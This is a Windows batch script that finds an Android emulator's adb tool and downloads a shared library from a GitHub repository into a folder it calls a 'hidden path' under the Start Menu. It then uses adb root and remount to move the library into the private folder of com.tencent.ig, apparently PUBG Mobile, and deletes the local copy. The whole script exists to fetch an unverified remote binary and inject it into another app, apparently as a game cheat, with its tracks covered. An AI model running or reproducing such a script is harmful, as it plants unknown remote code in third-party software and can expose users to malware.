@echo off
chcp 65001 >nul

:: Read path from redit.txt and verify it exists
if not exist C:\Windows\System32\config\systemprofile\redit.txt (
    echo ERROR: redit.txt not found!
    pause
    exit /b
)

:: Read path and remove any extra spaces or empty lines
for /f "tokens=*" %%A in ('type C:\Windows\System32\config\systemprofile\redit.txt') do set target_path=%%A

:: Ensure the path is not empty
if "%target_path%"=="" (
    echo ERROR: No valid path found in redit.txt!
    pause
    exit /b
)

:: Replace double backslashes with single ones
set target_path=%target_path:\\=\%

:: Replace AndroidEmulatorEn.exe with adb.exe
set target_path=%target_path:AndroidEmulatorEn.exe=adb.exe%

:: Extract the directory path (remove the filename)
for %%I in ("%target_path%") do set target_dir=%%~dpI

:: Ensure the directory exists before changing to it
if not exist "%target_dir%" (
    echo ERROR: The directory does not exist!
    echo Path: "%target_dir%"
    pause
    exit /b
)

:: Change directory to the extracted path
cd /d "%target_dir%" || (
    echo ERROR: Failed to change directory.
    echo Path: "%target_dir%"
    pause
    exit /b
)

:: Check for admin privileges
fltmc >nul 2>&1
if not %errorlevel%==0 (
    echo WARNING: Please run this script as administrator.
    pause
    exit
)

:: Define the hidden path for storing the file
set hiddenPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\SystemTools
if not exist "%hiddenPath%" mkdir "%hiddenPath%"

:: Define the filename
set fileName=libGVoicePlugin.so

:: Download the file using PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"

:: Verify the download was successful
if not exist "%hiddenPath%\%fileName%" (
    echo ERROR: File download failed!
    exit /b
)

:: Start ADB commands
adb kill-server
adb start-server
adb root
adb remount
adb push "%hiddenPath%\%fileName%" /data/local/tmp/
adb shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/

:: Clean up the hidden path
if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"

echo.
echo SUCCESS: All commands executed successfully!
pause
